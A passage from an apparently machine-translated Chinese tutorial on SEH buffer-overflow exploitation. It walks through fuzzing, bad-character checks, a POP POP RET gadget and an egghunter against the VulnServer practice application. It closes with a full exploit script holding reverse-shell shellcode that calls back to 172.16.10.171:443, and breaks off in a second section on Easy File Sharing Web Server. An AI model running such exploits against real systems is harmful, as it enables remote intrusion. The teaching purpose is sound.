6000</span><br></pre></td></tr></table></figure><p>并将其与我们的模糊测试脚本结合在一起，但不必每次都重复A的增量200字节，我们只需将我们的模式与 <code>GMON :./</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">buffer = &quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa....&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print &quot;[*] Starting to Fuzz GMON with pattern containing %s bytes&quot; %len(buffer)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,9999))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 9999&quot;</span><br><span class="line">s.send((&apos;GMON /.:/&apos; + buffer))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GMON with %s bytes&quot; %len(buffer)</span><br></pre></td></tr></table></figure><p>现在，我们的应用程序将返回崩溃状态并报告a，<code>Access Violation</code>但是这次<strong>SE Handler</strong>包含<code>45336E45</code>的内容相比<code>41414141</code>-让我们再次跳转到堆栈并检查当前驻留在堆栈上的数据。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011114610.png" class="lozad"></p><p>完善！如您所见，我们正在查看我们永不重复的字符串，并且无法仅通过在<strong>mona中</strong>使用以下命令之一来计算偏移量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!mona findmsp</span><br><span class="line">!mona po 1En2</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011114621.png" class="lozad"></p><p>如您所见，我们花了<strong>3515</strong> <strong>个字节</strong>来超出<strong>nSEH</strong>的值，而花了<strong>3519个字节</strong>来超过<strong>SE Handler</strong>的值-在我开始拼凑所有内容之前，我想首先花时间来查找任何不良字符。</p><h3 id="2-1-3-寻找坏字符"><a href="#2-1-3-寻找坏字符" class="headerlink" title="2.1.3 寻找坏字符"></a>2.1.3 寻找坏字符</h3><p>我不会在这里解释为什么我们需要找到坏字符，因为我在<a href="https://m0chan.github.io/2019/08/20/Simple-Win32-Buffer-Overflow-EIP-Overwrite.html" target="_blank" rel="noopener">第1部分中</a>做了很好的工作，所以就去那里。</p><p>让我们使用下面的简单脚本，通过命令将每个可能的字符的字符串发送到<strong>VulnServer</strong><code>GMON</code>。当然，我们将<code>\x00</code>字符（即<strong>空字节）</strong>排除在外<strong>。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nseh = &quot;B&quot;*4</span><br><span class="line">seh = &quot;C&quot;*4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">badchars = (&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f&quot;</span><br><span class="line">&quot;\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;</span><br><span class="line">&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f&quot;</span><br><span class="line">&quot;\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f&quot;</span><br><span class="line">&quot;\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f&quot;</span><br><span class="line">&quot;\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf&quot;</span><br><span class="line">&quot;\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf&quot;</span><br><span class="line">&quot;\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buffer = &quot;A&quot; * (3515-len(badchars))</span><br><span class="line">print &quot;[*] There are %s&quot; %len(badchars) + &quot; bad chars to test&quot;</span><br><span class="line">print &quot;[*] Starting to Fuzz GMON with %s bytes&quot; %len(buffer) + &quot; A&apos;s&quot;</span><br><span class="line">buffer += badchars #All of badchars</span><br><span class="line">buffer += nseh #BBBB</span><br><span class="line">buffer += seh #CCCC</span><br><span class="line">junk = &quot;D&quot;*(5000-len(buffer))</span><br><span class="line">buffer += junk #Bunch of D&quot;s to fill remaining space</span><br><span class="line"></span><br><span class="line">print &quot;[*] Starting to Fuzz GMON with everything containing %s bytes&quot; %len(buffer)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,9999))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 9999&quot;</span><br><span class="line">s.send((&apos;GMON /.:/&apos; + buffer))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GMON with %s bytes&quot; %len(buffer)</span><br></pre></td></tr></table></figure><p>现在，仅简要介绍我们在这里所做的事情</p><ol><li><p>计算不良字符的数量并从<code>3515</code>我们的<strong>偏移量</strong>减去该值</p></li><li><p>发送 <code>3260 A&#39;s + 255 bad chars</code></p></li><li><p>发送<code>BBBB</code>以覆盖<strong>nSEH</strong>值</p></li><li><p>发送<code>CCCC</code>以覆盖<strong>SEH</strong>值</p></li><li><p>填充剩余空间 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDDD...</span><br></pre></td></tr></table></figure><ol><li>我们这样做的原因是我们没有填充剩余空间，所以<strong>SEH</strong>不会触发</li></ol></li></ol><p>ps：由于<strong>SE处理程序</strong>（又称52字节）之后空间的限制，我决定在覆盖<strong>nSEH</strong>和<strong>SEH</strong>之前发送错误字符</p><p>检查内存转储，我们可以看到除了<strong>空字节</strong>又名，我们实际上有零个坏字符<code>\x00</code></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011114634.png" class="lozad"></p><h3 id="2-1-4-查找POP-POP-RET指令"><a href="#2-1-4-查找POP-POP-RET指令" class="headerlink" title="2.1.4 查找POP POP RET指令"></a>2.1.4 查找POP POP RET指令</h3><p>我已经详细说明<code>POP POP RET</code>了指令的顺序及其重要性，因此我将坚持实用并让上面的部分<code>A Mention on POP POP RET</code>进行讨论。</p><p>首先让我们找到一个适用的模块，该模块将使用以下带有<strong>mona的</strong>命令包含此指令序列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona seh</span><br></pre></td></tr></table></figure><p>在这里，一个明显的选择是突出的，<code>efffunc.dll</code>因为它没有使用任何安全机制（例如<code>SafeSEH</code> 或）进行编译<code>ASLR</code></p><p>让我们双击该模块，然后验证组装说明并确保这是我们所需要的。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011114653.png" class="lozad"></p><p>完美，我们有<code>POP EBX</code> <code>POP EBP</code>和<code>RETN</code>指令。这正是我们所需要的<code>POP POP RET</code></p><p>对于这一部分，我建议您在<code>POP POP RET</code>函数的开头放置一个断点，以便您可以逐步进行下一部分以了解会发生什么，只需在<strong>mona中</strong>双击所选模块，然后按<code>F2</code>一下<code>POP EBX</code>说明即可。</p><p>现在，我将修改python脚本，以如下所示用指令<code>seh</code>的值覆盖变量<code>POP POP RET</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nseh = &quot;B&quot;*4</span><br><span class="line">seh = &quot;\xb4\x10\x50\x62&quot; #0x625010b4 pop,pop,ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buffer = &quot;A&quot; * 3515</span><br><span class="line">print &quot;[*] Starting to Fuzz GMON with %s bytes&quot; %len(buffer) + &quot; A&apos;s&quot;</span><br><span class="line">buffer += nseh #BBBB</span><br><span class="line">buffer += seh #CCCC</span><br><span class="line">junk = &quot;D&quot;*(5000-len(buffer))</span><br><span class="line">buffer += junk #Bunch of D&quot;s to fill remaining space</span><br><span class="line"></span><br><span class="line">print &quot;[*] Starting to Fuzz GMON with everything containing %s bytes&quot; %len(buffer)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,9999))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 9999&quot;</span><br><span class="line">s.send((&apos;GMON /.:/&apos; + buffer))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GMON with %s bytes&quot; %len(buffer)</span><br></pre></td></tr></table></figure><p>让我们运行此脚本，再次跳转到<strong>Immunity</strong>，看看发生了什么。</p><p>在我们检查堆栈或内存转储之前，让我们快速检查一下<strong>SEH链</strong></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011114708.png" class="lozad"></p><p>完美，<strong>SE处理</strong>程序指向<code>POP POP RET</code>我们所选DLL中的指令，在这种情况下<code>0x625010B4</code>-&gt;<code>essfunc.dll</code></p><p>快速分析堆栈和内存转储也都可以。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011114718.png" class="lozad"></p><p>当然，因为我们只是在应用程序处于崩溃状态时将所有内容拼凑在一起，但是让我们将我们的异常传递给程序，通过该程序将堆栈上的<strong>SE Handler</strong><code>Shift+F9</code>的值发送到<strong>EIP寄存器</strong>，<strong>EIP寄存器</strong>将依次跳转按照我们的指示。<code>POP POP RET</code></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011141010.png" class="lozad"></p><p>完善！正是我们所需要的，将我们的<strong>SE Handler</strong>值<code>625010B4</code>in推送到<code>EIP</code>了我们的<code>POP POP RET</code>说明中，如左上方所示。</p><p>现在，如果我们通过按逐步操作<code>F7</code>，则将首先进行操作<code>POP EBX</code> <code>POP EBP</code>，最后进行操作<code>RETN</code>，这将使我们达到<strong>nSEH</strong>的值-在这种情况下<code>BBBB</code></p><p>只是为了更详细地解释这里发生了什么</p><ul><li><strong>POP EBX</strong> - <em>POP的</em>栈顶到<strong>EBX注册</strong> - <strong>7DEB6AB9</strong></li><li><strong>POP EBP</strong> - <em>POP的</em>栈顶到<strong>EBP注册</strong> - <strong>0237ED34</strong></li><li><strong>RETN</strong> - <em>返回</em> /堆栈的顶部为推动价值<strong>EIP寄存器</strong> - <strong>0237FFC4</strong></li></ul><p>现在您可能会注意到<strong>0237FFC4</strong>看起来很熟悉，如果再次查看<strong>SEH Chain</strong>，我们将看到<strong>0237FFC4</strong>对应于<strong>nSEH</strong></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011141031.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011141046.png" class="lozad"></p><p>如您所见，<strong>EIP</strong>点也<code>024FFFC4</code>与左上方的指令相关，查看这些指令，我们可以看到“ 42 42 42 42 <code>which represents our</code>“ B” * 4”。</p><h3 id="2-1-5-生成Egghunter"><a href="#2-1-5-生成Egghunter" class="headerlink" title="2.1.5 生成Egghunter"></a>2.1.5 生成Egghunter</h3><p>正如我已经谈到了为什么使用Egghunter以及它们如何工作一样，我将直接进入它，首先让我们分析堆栈以及在这里使用什么。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011141059.png" class="lozad"></p><p>如前所述，需要<strong>3515字节</strong>来获取太<strong>nSEH，</strong>而需要<strong>3519字节</strong>来覆盖指向<strong>SE处理程序</strong>的指针，之后我们有<strong>52字节</strong>的空间，在这种情况下，由<code>DDDDD...</code>- 表示：-当然52字节对于我们的<em>shellcode</em>来说不是足够的空间，但是对于Egghunter来说已经足够了，因为我们只需要<strong>32个字节</strong> - 只要我们可以使用相关的Egghunter <em>标签</em>通过其他方式将shellcode放入内存，我们就应该能够执行。</p><p>像往常一样，由于简单，我将在此阶段使用<strong>mona</strong>来帮助我。</p><p><strong>使用Mona生成Egghunter</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona egg -t MOCH</span><br></pre></td></tr></table></figure><p>默认情况下，<strong>mona</strong>会生成一个带有默认标签的Egghunter，它的默认标签<code>w00t</code>可以很好地工作，但是在这里我选择指定一个自定义标签<code>MOCH</code></p><p>完美，现在让我们将其添加到我们的利用脚本中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">egghunter = (&quot;\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74&quot;</span><br><span class="line">&quot;\xef\xb8\x4d\x4f\x43\x48\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7&quot;)</span><br></pre></td></tr></table></figure><p>值得注意的是，Egghunters也应检查以前发现的不良字符。</p><p>我们还将<code>tag</code>在变量<strong>TWICE中</strong>定义变量，以便Egghunter在执行和搜索内存时不会发现自己。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">egg = &apos;MOCHMOCH&apos;</span><br></pre></td></tr></table></figure><p>我还将花时间<code>junk</code>用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">buffer += egghunter</span><br><span class="line">junk = &quot;D&quot;*(5000-len(buffer))</span><br><span class="line">buffer += junk #Bunch of D&quot;s to fill remaining space</span><br></pre></td></tr></table></figure><p>这将允许我们在<strong>SEH</strong>之后直接添加Egghunter shell代码，然后添加一堆D来填充剩余空间，以防万一。</p><p>现在让我们生成一些shell代码，对整体漏洞进行最后调整，然后尝试一下。</p><h3 id="2-1-6-跳到Egghunter"><a href="#2-1-6-跳到Egghunter" class="headerlink" title="2.1.6 跳到Egghunter"></a>2.1.6 跳到Egghunter</h3><p>现在只是重申此处的目的是<strong>超速**</strong>SEH<strong>，执行一个<code>POP POP RET</code>序列，该序列</strong>又将nSEH<strong>的值</strong>压<strong>入</strong>EIP寄存器** -在这种情况下，我们希望将Egghunter的地址放在<strong>nSEH之上</strong>或以某种形式的指令将使我们跳入我们的Egghunter shellcode，再次，如果我们检查堆栈，我们会发现我们走得太远。</p><h3 id="2-1-7-生成Shellcode和最终利用"><a href="#2-1-7-生成Shellcode和最终利用" class="headerlink" title="2.1.7 生成Shellcode和最终利用"></a>2.1.7 生成Shellcode和最终利用</h3><p>一如既往，我将在这里使用MSFVenom生成一些shellcode，因为我们并不是真正在与高级防病毒软件或任何其他工具作斗争，所以不必花哨，我们只需使用下面的代码即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m0chan@kali:/&gt; msfvenom -p windows/shell_reverse_tcp LHOST=172.16.10.171 LPORT=443 EXITFUNC=thread -f c -a x86 --platform windows -b &quot;\x00&quot;</span><br></pre></td></tr></table></figure><p>现在生成了很棒的shell代码，我们只是将其弹出到最终的利用中。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011141111.png" class="lozad"></p><p>在这种情况下，你可以看到我们会从内存地址跳转<strong>0237FFC4</strong>到<strong>0237FFCC</strong>这将是在那里我们Egghunter会坐下。</p><p>现在在这里，我们只是用<strong>0237FFCC</strong>覆盖<strong>nSEH</strong>的地址，但是就像我说的那样，它不是很实用，并且最好做一个简单的短跳转（也称为操作码）-但是有一个小的变化。该指令只有<strong>2个字节</strong>，<strong>nSEH</strong>需要<strong>4个字节。</strong><code>EB``EB</code></p><p>这不是一个大问题，因为我们可以简单地使用<code>NOPS</code>aka，<code>\x90</code>所以我们在这里要做的是填充<strong>nSEH</strong>，<code>\x90\x90</code>这意味着<strong>2/4个字节</strong>已满，然后是代表跳转6个字节的<code>EB</code>指令<code>\xeb\x06</code>。现在，<strong>nSEH</strong>中填充了<strong>4/4个字节</strong></p><p>我们利用现在技术上跳<strong>8个字节</strong>，但我们只需要跳<strong>6个字节</strong>，因为我们<em>真的</em>只是<em>滑动</em>下来<strong>NOPS</strong>所以6个字节是所有的需要。</p><p>太好了，现在在漏洞利用程序中更新<strong>nSEH</strong>变量以反映以下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nseh = &quot;\xeb\x06\x90\x90&quot;</span><br></pre></td></tr></table></figure><p>当然，<strong>little endian</strong>再次是相反顺序的原因。</p><p><strong>最终利用</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">#Vulnserver GMON SEH Overflow w/ Egghunter</span><br><span class="line">#Author: m0chan</span><br><span class="line">#Date: 28/08/2019</span><br><span class="line"></span><br><span class="line">nseh = &quot;\xeb\x06\x90\x90&quot; #0x909006be - nop,nop,jump 6 bytes with EB into egghunter</span><br><span class="line">seh = &quot;\xb4\x10\x50\x62&quot; #0x625010br pop,pop,ret</span><br><span class="line"></span><br><span class="line">eggnops = &quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span><br><span class="line"></span><br><span class="line">egghunter = (</span><br><span class="line">&quot;\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74&quot;</span><br><span class="line">&quot;\xef\xb8\x74\x65\x65\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7&quot;)</span><br><span class="line"></span><br><span class="line">egg = &apos;MOCHMOCH&apos;</span><br><span class="line"></span><br><span class="line">#msfvenom -p windows/shell_reverse_tcp LHOST=172.16.10.171 LPORT=443 -e x86/shikata_ga_nai EXITFUNC=thread -f c -a x86 --platform windows -b &quot;\x00\x80\x0a\x0c\x0d&quot;</span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line">&quot;\xda\xc4\xbf\xcf\xa2\xc0\xf1\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1&quot;</span><br><span class="line">&quot;\x52\x83\xeb\xfc\x31\x7b\x13\x03\xb4\xb1\x22\x04\xb6\x5e\x20&quot;</span><br><span class="line">&quot;\xe7\x46\x9f\x45\x61\xa3\xae\x45\x15\xa0\x81\x75\x5d\xe4\x2d&quot;</span><br><span class="line">&quot;\xfd\x33\x1c\xa5\x73\x9c\x13\x0e\x39\xfa\x1a\x8f\x12\x3e\x3d&quot;</span><br><span class="line">&quot;\x13\x69\x13\x9d\x2a\xa2\x66\xdc\x6b\xdf\x8b\x8c\x24\xab\x3e&quot;</span><br><span class="line">&quot;\x20\x40\xe1\x82\xcb\x1a\xe7\x82\x28\xea\x06\xa2\xff\x60\x51&quot;</span><br><span class="line">&quot;\x64\xfe\xa5\xe9\x2d\x18\xa9\xd4\xe4\x93\x19\xa2\xf6\x75\x50&quot;</span><br><span class="line">&quot;\x4b\x54\xb8\x5c\xbe\xa4\xfd\x5b\x21\xd3\xf7\x9f\xdc\xe4\xcc&quot;</span><br><span class="line">&quot;\xe2\x3a\x60\xd6\x45\xc8\xd2\x32\x77\x1d\x84\xb1\x7b\xea\xc2&quot;</span><br><span class="line">&quot;\x9d\x9f\xed\x07\x96\xa4\x66\xa6\x78\x2d\x3c\x8d\x5c\x75\xe6&quot;</span><br><span class="line">&quot;\xac\xc5\xd3\x49\xd0\x15\xbc\x36\x74\x5e\x51\x22\x05\x3d\x3e&quot;</span><br><span class="line">&quot;\x87\x24\xbd\xbe\x8f\x3f\xce\x8c\x10\x94\x58\xbd\xd9\x32\x9f&quot;</span><br><span class="line">&quot;\xc2\xf3\x83\x0f\x3d\xfc\xf3\x06\xfa\xa8\xa3\x30\x2b\xd1\x2f&quot;</span><br><span class="line">&quot;\xc0\xd4\x04\xff\x90\x7a\xf7\x40\x40\x3b\xa7\x28\x8a\xb4\x98&quot;</span><br><span class="line">&quot;\x49\xb5\x1e\xb1\xe0\x4c\xc9\x12\xe4\x44\xa2\x03\x07\x58\xb5&quot;</span><br><span class="line">&quot;\x68\x8e\xbe\xdf\x9e\xc7\x69\x48\x06\x42\xe1\xe9\xc7\x58\x8c&quot;</span><br><span class="line">&quot;\x2a\x43\x6f\x71\xe4\xa4\x1a\x61\x91\x44\x51\xdb\x34\x5a\x4f&quot;</span><br><span class="line">&quot;\x73\xda\xc9\x14\x83\x95\xf1\x82\xd4\xf2\xc4\xda\xb0\xee\x7f&quot;</span><br><span class="line">&quot;\x75\xa6\xf2\xe6\xbe\x62\x29\xdb\x41\x6b\xbc\x67\x66\x7b\x78&quot;</span><br><span class="line">&quot;\x67\x22\x2f\xd4\x3e\xfc\x99\x92\xe8\x4e\x73\x4d\x46\x19\x13&quot;</span><br><span class="line">&quot;\x08\xa4\x9a\x65\x15\xe1\x6c\x89\xa4\x5c\x29\xb6\x09\x09\xbd&quot;</span><br><span class="line">&quot;\xcf\x77\xa9\x42\x1a\x3c\xc9\xa0\x8e\x49\x62\x7d\x5b\xf0\xef&quot;</span><br><span class="line">&quot;\x7e\xb6\x37\x16\xfd\x32\xc8\xed\x1d\x37\xcd\xaa\x99\xa4\xbf&quot;</span><br><span class="line">&quot;\xa3\x4f\xca\x6c\xc3\x45&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buffer = &quot;A&quot; * (3515-len(egg + shellcode))</span><br><span class="line">print &quot;[*] Adding Egghunter tag &quot; + egg + &quot; alongside A Buffer&quot;</span><br><span class="line">buffer += egg</span><br><span class="line">buffer += shellcode</span><br><span class="line">print &quot;[*] Starting to Fuzz GMON with %s bytes&quot; %len(buffer) + &quot; A&apos;s&quot;</span><br><span class="line">buffer += nseh</span><br><span class="line">print &quot;[*] Overwriting nSEH Value with &quot; + nseh</span><br><span class="line">buffer += seh #0x625010br pop,pop,ret</span><br><span class="line">print &quot;[*] Overwriting SEH Value with &quot; + seh</span><br><span class="line">buffer += eggnops</span><br><span class="line">buffer += egghunter</span><br><span class="line">junk = &quot;J&quot;*(5000-len(buffer))</span><br><span class="line">buffer += junk #Bunch of D&quot;s to fill remaining space</span><br><span class="line"></span><br><span class="line">print &quot;[*] Starting to Fuzz GMON with everything containing %s bytes&quot; %len(buffer)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,9999))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 9999&quot;</span><br><span class="line">s.send((&apos;GMON /.:/&apos; + buffer))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GMON with %s bytes&quot; %len(buffer)</span><br></pre></td></tr></table></figure><p><code>443</code>假设我们有一个打开的监听器，我们将收到一个反向外壳-在这里值得注意的是，这<strong>只能</strong>在<code>Windows 7 x86</code>此工作是由于Egghunter启动系统调用的方式，即<code>INT 2E</code>-整个体系结构稍有不同，因此我们的<strong>mona</strong> Egghunter将仅在 <code>32 Bit</code></p><p>我决定创建此小图来从较高的角度表示漏洞，并尝试显示每个相关的跳转-我的visio技能不是很好，所以请问！</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011141125.png" class="lozad"></p><h2 id="2-2-无需Egghunter的轻松文件共享Web服务器7-2"><a href="#2-2-无需Egghunter的轻松文件共享Web服务器7-2" class="headerlink" title="2.2 无需Egghunter的轻松文件共享Web服务器7.2"></a>2.2 无需Egghunter的轻松文件共享Web服务器7.2</h2><p>轻松文件共享Web服务器是Win XP / Win 7时代的遗留软件，它使访问者可以轻松地通过选择的Web浏览器轻松上传/下载文件，尽管它在被<strong>Stack Overflows</strong>充斥着众多漏洞时非常有用到<strong>SEH溢出</strong>。</p><h3 id="2-2-1-模糊和发现崩溃"><a href="#2-2-1-模糊和发现崩溃" class="headerlink" title="2.2.1 模糊和发现崩溃"></a>2.2.1 模糊和发现崩溃</h3><p>与之前的示例类似，我将<em>停留</em>在<em>模糊测试</em>阶段，因为我不想花费大量时间对每个输入/参数进行模糊测试，也就是说，在此示例中，我们将以<strong>HTTP</strong>协议为目标并<code>boozfuzz</code>支持<strong>HTTP</strong>模糊测试，因此请检查一下！我很快将只写一篇关于模糊测试和不同技术的文章。</p><p>由于该漏洞位于<strong>HTTP中，</strong>因此有几种方法可以使用python做到这一点，我们可以使用该<code>requests</code>库，也可以仅通过端口80连接并发送原始<strong>HTTP请求。</strong>-我将在此处输入Port 80 / Raw Requests，并可能<code>requests</code>在最后重写脚本。</p><p>首先让我们从一个基本的FUZZ脚本开始，直到发生崩溃为止，这里的漏洞位于<code>GET</code>变量内部，底层应用程序试图在其中获取传递的输入内容，<code>GET</code>并且无法进行边界检查和任何清理等操作。</p><p>这是一个示例示例，我们将使用python发送HTTP请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 